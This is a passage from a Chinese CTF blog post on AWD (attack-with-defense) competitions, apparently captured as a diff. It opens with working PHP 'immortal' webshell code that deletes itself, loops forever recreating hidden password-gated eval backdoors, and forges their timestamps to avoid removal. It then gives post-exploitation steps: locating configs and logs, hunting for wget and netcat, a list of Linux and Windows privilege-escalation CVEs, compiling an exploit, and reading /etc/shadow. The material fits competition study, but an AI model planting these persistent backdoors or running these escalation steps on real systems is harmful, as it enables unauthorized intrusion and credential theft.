if(md5($_POST[&quot;passwd&quot;])==&quot;8c7d608cbb4c63f32be59a9ba8c9f49d&quot;)&#123;@eval($_REQUEST[&quot;cmd&quot;]);&#125; ?&gt;&#x27;</span>;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2020-12-01 09:10:12&quot; shell.php&#x27;</span>);  <span class="hljs-comment">//修改时间，防止被删</span><br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//passwd=AabyssTeam</span><br><span class="hljs-comment">//POST传参：passwd=AabyssTeam&amp;cmd=system(&#x27;ls&#x27;);</span><br></code></pre></td></tr></table></figure>
+
+<p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 <code>shell.php</code> 的WebShell文件</p>
+<p>双重不死马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.login.php&#x27;</span>;<br><span class="hljs-variable">$file1</span> = <span class="hljs-string">&#x27;/admin/.register.php&#x27;</span>; <br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;8c7d608cbb4c63f32be59a9ba8c9f49d&quot;)&#123;@eval($_REQUEST[&quot;cmd&quot;]);&#125; ?&gt;&#x27;</span>;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2020-12-01 18:10:12&quot; .login.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file1</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2020-12-01 18:10:12&quot; /admin/.register.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//passwd=AabyssTeam</span><br><span class="hljs-comment">//POST传参：passwd=AabyssTeam&amp;cmd=system(&#x27;ls&#x27;);</span><br></code></pre></td></tr></table></figure>
+
+<p>浏览器访问写入的WebShell，会自动生成两个不死马： <code>.login.php</code> 和 <code>/admin/.register.php</code></p>
+<h4 id="3-3-2-关键文件检索"><a href="#3-3-2-关键文件检索" class="headerlink" title="3.3.2 关键文件检索"></a>3.3.2 关键文件检索</h4><p>组件检索</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -name <span class="hljs-string">&quot;apaech2.conf&quot;</span>                 <span class="hljs-comment">//检索Apache主配置文件</span><br>find / -name <span class="hljs-string">&quot;nginx.conf&quot;</span>                   <span class="hljs-comment">//检索Nginx目录</span><br>find / -path <span class="hljs-string">&quot;*nginx*&quot;</span> -name nginx*conf     <span class="hljs-comment">//检索Nginx配置目录</span><br>find / -name <span class="hljs-string">&quot;httpd.conf&quot;</span>                   <span class="hljs-comment">//检索Apache目录</span><br>find / -path <span class="hljs-string">&quot;*apache*&quot;</span> -name apache*conf   <span class="hljs-comment">//检索Apache配置目录</span><br></code></pre></td></tr></table></figure>
+
+<p>网站首页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -name <span class="hljs-string">&quot;index.php&quot;</span>                    <span class="hljs-comment">//定位网站目录</span><br>find / -name <span class="hljs-string">&quot;index.html&quot;</span>                   <span class="hljs-comment">//定位网站目录</span><br></code></pre></td></tr></table></figure>
+
+<p>日志文件检索</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">/var/<span class="hljs-built_in">log</span>/nginx/                           <span class="hljs-comment">//默认Nginx日志目录</span><br>/var/<span class="hljs-built_in">log</span>/apache/                          <span class="hljs-comment">//默认Apache日志目录</span><br>/var/<span class="hljs-built_in">log</span>/apache2/                         <span class="hljs-comment">//默认Apache日志目录</span><br>/usr/local/tomcat/logs                    <span class="hljs-comment">//Tomcat日志目录</span><br>tail -f xxx.<span class="hljs-built_in">log</span>                           <span class="hljs-comment">//实时刷新滚动日志文件</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3-3-3-Linux提权"><a href="#3-3-3-Linux提权" class="headerlink" title="3.3.3 Linux提权"></a>3.3.3 Linux提权</h4><p>查询系统版本信息命令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /etc/issue<br>cat /etc<span class="hljs-comment">/*-release</span><br><span class="hljs-comment">cat /etc/lsb-release</span><br><span class="hljs-comment">cat /etc/redhat-release</span><br></code></pre></td></tr></table></figure>
+
+<p>查询内核版本信息命令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">uname -a<br>uname -mrs<br>cat /proc/version<br>cat /etc/issue<br>lsb_release -a<br>hostnamectl  <br>rpm -q kernel<br>dmesg | grep Linux<br>ls /boot | grep vmlinuz<br></code></pre></td></tr></table></figure>
+
+<p>查看系统环境变量命令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /etc/profile<br>cat /etc/bashrc<br>cat ~/.bash_profile<br>cat ~/.bashrc<br>cat ~/.bash_logout<br>env<br><span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure>
+
+<p>查看语言环境信息命令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -name perl*<br>find / -name python*<br>find / -name gcc*<br>find / -name cc<br><span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure>
+
+<p>查看文件上传环境信息命令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -name wget<br>find / -name nc*<br>find / -name netcat*<br>find / -name tftp*<br>find / -name ftp<br></code></pre></td></tr></table></figure>
+
+<p>这里列举一些可用利用的提权漏洞：</p>
+<ul>
+<li>CVE-2023-0386（Linux OverlayFS权限提升漏洞）</li>
+<li>CVE-2021-4034（Linux Polkit本地权限提升漏洞）</li>
+<li>CVE-2017-6074 （DCCP双重释放漏洞 &gt; 2.6.18 ）</li>
+<li>CVE-2016-5195（脏牛，kernel 2.6.22 &lt; 3.9 (x86&#x2F;x64)）</li>
+<li>CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）</li>
+<li>CVE-2017-1000367（sudo本地提权漏洞 ）</li>
+<li>CVE-2016-1247（Nginx权限提升漏洞）</li>
+<li>CVE-2017-16995（Ubuntu16.04   kernel:4.14-4.4）</li>
+</ul>
+<p>Kali命令查询：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> CentOS <span class="hljs-number">7</span><br><span class="hljs-attribute">searchsploit</span> Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure>
+
+<p>提权Exploit寻找：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.exploit-db.com/">http://www.exploit-db.com</a></li>
+<li><a target="_blank" rel="noopener" href="http://metasploit.com/modules/">http://metasploit.com/modules/</a></li>
+<li><a target="_blank" rel="noopener" href="http://securityreason.com/">http://securityreason.com</a></li>
+<li><a target="_blank" rel="noopener" href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a></li>
+<li><a target="_blank" rel="noopener" href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main</a></li>
+</ul>
+<p>编译提权Exp</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gcc -o <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<span class="hljs-regexp">/***** /u</span>sr<span class="hljs-regexp">/share/</span>nginx<span class="hljs-regexp">/html/</span>*****.c -Wall<br></code></pre></td></tr></table></figure>
+
+<p>直接提权，确认权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure>
+
+<p>其他提权姿势：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/244627.html">https://www.freebuf.com/articles/system/244627.html</a></p>
+<h4 id="3-3-4-Windows提权"><a href="#3-3-4-Windows提权" class="headerlink" title="3.3.4 Windows提权"></a>3.3.4 Windows提权</h4><p>这里列举一些Windows的漏洞：</p>
+<ul>
+<li>各种Potato（Github上面基本都有）</li>
+<li>CVE-2023-35359（Windows内核权限提升漏洞，开源了）</li>
+<li>CVE-2022-24521（没有Exp的可以找我要）</li>
+<li>CVE-2019-1405</li>
+<li>CVE-2019-1322</li>
+<li>MS17-017（整型溢出漏洞）</li>
+</ul>
+<h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4# 参考链接"></a>4# 参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://freebuf.com/">http://freebuf.com/</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.zgsec.cn/">https://blog.zgsec.cn/</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/3044/">https://paper.seebug.org/3044/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/">https://www.anquanke.com/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.bugscan.net/source/template/vulns/">http://www.bugscan.net/source/template/vulns/</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12687">https://xz.aliyun.com/t/12687</a></li>
+</ul>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/">#笔记</a>
+      
+        <a href="/tags/AWDPwn/">#AWDPwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>AWD 笔记</div>
+      <div>https://www.w4y2sh3ll.top/2024/05/24/AWD-笔记/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>W4y2Sh3ll</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/29/ProtobufPwn/" title="ProtobufPwn">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ProtobufPwn</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/17/arm-pwn-%E7%AC%94%E8%AE%B0/" title="arm pwn 笔记">
+                        <span class="hidden-mobile">arm pwn 笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.7/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://blog-comments-beige.vercel.app","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+              Fluid.plugins.imageCaption(imgSelector);
+              Fluid.plugins.fancyBox(imgSelector);
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>W4y2Sh3ll</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
